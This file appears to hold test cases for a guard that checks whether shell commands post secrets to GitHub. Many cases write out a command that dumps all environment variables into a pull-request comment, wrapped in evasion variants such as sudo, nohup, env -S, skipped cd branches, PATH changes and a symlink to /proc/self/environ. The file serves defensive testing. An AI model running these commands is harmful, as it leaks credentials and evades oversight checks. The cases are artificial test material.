# CRW-875 (a shell that runs a script file), CRW-917 (GitHub post normalisation) and CRW-984 (the open script-file readings of
# the GitHub guard). The GitHub guard reads a script file a shell runs; files are written under the working directory.

=== CRW-875-01 | none/deny/allow
--why bash with a script file that posts: the guard reads the file and refuses.
--file post.sh
gh pr comment 1 -b "$(env)"
--cmd
bash post.sh

=== CRW-875-02 | none/deny/allow
--why sh with the same script.
--file post.sh
gh pr comment 1 -b "$(env)"
--cmd
sh post.sh

=== CRW-875-03 | none/deny/allow
--why source of the posting script.
--file post.sh
gh pr comment 1 -b "$(env)"
--cmd
source post.sh

=== CRW-875-03b | none/deny/allow
--why The dot builtin of the posting script.
--file post.sh
gh pr comment 1 -b "$(env)"
--cmd
. post.sh

=== CRW-875-04 | B
--why A script whose only line is a clean --body-file post (form A) is allowed.
--file {TMP}/b.md
hello
--file post.sh
gh pr comment 1 --body-file {TMP}/b.md
--cmd
bash post.sh

=== CRW-875-05 | P
--why gh api --input - posts standard input: refused explicitly (item 5).
gh api repos/o/r/issues/1/comments --input -

=== CRW-875-06 | P
--why gh api -F body=@- posts standard input (item 5).
gh api repos/o/r/issues/1/comments -F body=@-

=== CRW-875-06b | P
--why --field body=@- is the long spelling.
gh api repos/o/r/issues/1/comments --field body=@-

=== CRW-875-07 | none/deny/allow
--why bash -x with the script file: options before the operand do not hide it.
--file post.sh
gh pr comment 1 -b "$(env)"
--cmd
bash -x post.sh

=== CRW-875-08 | none/deny/allow
--why bash -- ends the options; the operand is still the script.
--file post.sh
gh pr comment 1 -b "$(env)"
--cmd
bash -- post.sh

=== CRW-875-09 | none/deny/allow
--why timeout in front of the shell.
--file post.sh
gh pr comment 1 -b "$(env)"
--cmd
timeout 30 bash post.sh

=== CRW-875-10 | none/deny/allow
--why env with an assignment in front of the shell.
--file post.sh
gh pr comment 1 -b "$(env)"
--cmd
env X=1 bash post.sh

=== CRW-875-11 | none/deny/allow
--why nohup in front of the shell.
--file post.sh
gh pr comment 1 -b "$(env)"
--cmd
nohup bash post.sh

=== CRW-875-12 | none/deny/allow
--why command in front of the shell.
--file post.sh
gh pr comment 1 -b "$(env)"
--cmd
command bash post.sh

=== CRW-875-13 | none/deny/allow
--why exec in front of the shell.
--file post.sh
gh pr comment 1 -b "$(env)"
--cmd
exec bash post.sh

=== CRW-875-14 | none/deny/allow
--why A no-op cd and a list.
--file post.sh
gh pr comment 1 -b "$(env)"
--cmd
cd . && bash post.sh

=== CRW-875-15 | none/deny/allow
--why A background shell.
--file post.sh
gh pr comment 1 -b "$(env)"
--cmd
bash post.sh &

=== CRW-875-16 | none/deny/allow
--why timeout with an option that takes a value.
--file post.sh
gh pr comment 1 -b "$(env)"
--cmd
timeout -s KILL 30 bash post.sh

=== CRW-875-17 | B
--why Control: a script without a post is not a target.
--file clean.sh
echo ok
--cmd
timeout 30 bash clean.sh

=== CRW-875-18 | B
--why Control: an ordinary orchestrator command.
cd . && make

=== CRW-875-19 | none/deny/allow
--why sudo in front of the shell.
--file post.sh
gh pr comment 1 -b "$(env)"
--cmd
sudo bash post.sh

=== CRW-875-20 | none/deny/allow
--why sudo with an option that takes a value.
--file post.sh
gh pr comment 1 -b "$(env)"
--cmd
sudo -u root bash post.sh

=== CRW-875-21 | none/deny/allow
--why nice in front of the shell.
--file post.sh
gh pr comment 1 -b "$(env)"
--cmd
nice bash post.sh

=== CRW-875-22 | none/deny/allow
--why time in front of the shell.
--file post.sh
gh pr comment 1 -b "$(env)"
--cmd
time bash post.sh

=== CRW-875-23 | none/deny/allow
--why A variable assignment in front of the shell.
--file post.sh
gh pr comment 1 -b "$(env)"
--cmd
X=1 bash post.sh

=== CRW-875-24 | none/deny/allow
--why A list operator before the shell.
--file post.sh
gh pr comment 1 -b "$(env)"
--cmd
true; bash post.sh

=== CRW-875-25 | P
--why Direct execution of an executable text script (D2).
--file post.sh
#!/bin/sh
gh pr comment 1 -b "$(env)"
--cmd
./post.sh

=== CRW-875-26 | P
--why Direct execution through a subdirectory path.
--file scripts/post.sh
#!/bin/sh
gh pr comment 1 -b "$(env)"
--cmd
scripts/post.sh

=== CRW-875-27 | B
--why Control: sudo of an ordinary program.
sudo apt-get update

=== CRW-875-28 | B
--why Control: a binary executable is not a script (D2: NUL in the first 4 KiB).
--file bin/tool
#!{NUL}binary
--cmd
./bin/tool

=== CRW-875-29 | P
--why The gh api body file that is a link to a file outside the temporary roots is refused (item 6).
--link {TMP}/link.md /proc/self/environ
--cmd
gh pr comment 1 --body-file {TMP}/link.md

=== CRW-875-30 | B
--why Control: a regular body file inside the temporary root is allowed.
--file {TMP}/clean.md
hello
--cmd
gh pr comment 1 --body-file {TMP}/clean.md

=== CRW-875-31 | B
--why Control: a link to a file inside the temporary root is allowed.
--file {TMP}/real.md
hello
--link {TMP}/inner.md {TMP}/real.md
--cmd
gh pr comment 1 --body-file {TMP}/inner.md

=== CRW-875-32 | B
--why Boundary (item 7): a direct HTTP post with curl is out of the guard's scope.
curl -s -X POST https://api.github.com/repos/o/r/issues/1/comments -d @body.json

=== CRW-917-01 | P
--why A quoted option name is still the option (P0 of CRW-783): the title carries a secret.
gh pr comment 1 '--body' 'MY_API_KEY=sentinel'

=== CRW-917-02 | P
--why A quoted --body-file names a file with a secret.
--file {TMP}/secret.md
MY_API_KEY=sentinel
--cmd
gh pr comment 1 '--body-file' {TMP}/secret.md

=== CRW-917-03 | P
--why A quoted secret in the title of a pr create.
--file {TMP}/clean.md
hello
--cmd
gh pr create --title 'MY_API_KEY=sentinel' --body-file {TMP}/clean.md

=== CRW-917-04 | P
--why A redirect attached to the subcommand does not hide the post.
--file {TMP}/secret.md
MY_API_KEY=sentinel
--cmd
gh pr</dev/null comment 1 --body-file {TMP}/secret.md

=== CRW-917-05 | P
--why gh api --input reads a JSON body: a secret in a string value is refused.
--file {TMP}/post.json
{"body":"MY_API_KEY=sentinel"}
--cmd
gh api repos/o/r/issues/1/comments --input {TMP}/post.json

=== CRW-917-06 | B
--why A git checkout -b is no post (P1: refused only for the substring -b).
git checkout -b topic && git status

=== CRW-917-07 | P
--why gh api --input with a missing file is unreadable: refused.
gh api repos/o/r/issues/1/comments --input {TMP}/missing.json

=== CRW-917-08 | B
--why Control: a quoted clean --body-file passes after normalisation (A1).
--file {TMP}/clean.md
hello
--cmd
gh pr comment 1 '--body-file' {TMP}/clean.md

=== CRW-917-09 | B
--why Control: a clean JSON body in --input.
--file {TMP}/clean.json
{"body":"hello"}
--cmd
gh api repos/o/r/issues/1/comments --input {TMP}/clean.json

=== CRW-917-10 | P
--why An environment dump in a JSON string value: three NAME=value lines.
--file {TMP}/dump.json
{"body":"A=1\nB=2\nC=3"}
--cmd
gh api repos/o/r/issues/1/comments --input {TMP}/dump.json

=== CRW-917-11 | P
--why A FIFO body file must be refused without blocking.
--fifo {TMP}/body.fifo
--cmd
gh pr comment 1 --body-file {TMP}/body.fifo

=== CRW-984-01 | U
--why d1: a cd in a skipped branch must not move the directory the script is read in; the script in the working directory posts.
--file post.sh
gh pr comment 1 -b "$(env)"
--file sub/post.sh
echo clean
--cmd
if false; then cd sub; fi; bash post.sh

=== CRW-984-01b | U
--why d1: a cd in the body of a loop that may not run.
--file post.sh
gh pr comment 1 -b "$(env)"
--file sub/post.sh
echo clean
--cmd
while false; do cd sub; done; bash post.sh

=== CRW-984-01c | U
--why d1: a cd in a case branch that may not run.
--file post.sh
gh pr comment 1 -b "$(env)"
--file sub/post.sh
echo clean
--cmd
case x in never) cd sub;; esac; bash post.sh

=== CRW-984-02 | U
--why d2: a cd to a variable directory makes the directory unknown; the later relative cd must not make it known again.
--file sub/post.sh
echo clean
--cmd
D=/evil; cd "$D"; cd ./sub; bash post.sh

=== CRW-984-03 | none/deny/allow
--why d3: env -S splits into words, which must not be re-joined into shell text: the operand is the single word post.sh extra.
--file post.sh
echo clean
--file post.sh extra
gh pr comment 1 -b "$(env)"
--cmd
env -S bash 'post.sh extra'

=== CRW-984-04 | U
--why d4: declare -x PATH=... changes the path a source searches.
--file lib.sh
echo clean
--cmd
declare -x PATH=/evil:/usr/bin:/bin; source lib.sh

=== CRW-984-05 | T | deviation=attempt/allow/deny
--why CRW-951: cd may fail and execution can continue; the memory reader cannot prove the script directory. GitHub keeps its existing verdict; CRW-1099 refuses worktree operations with an unproven directory.
--file sub/clean.sh
echo clean
--cmd
cd {WORK}/sub; bash clean.sh
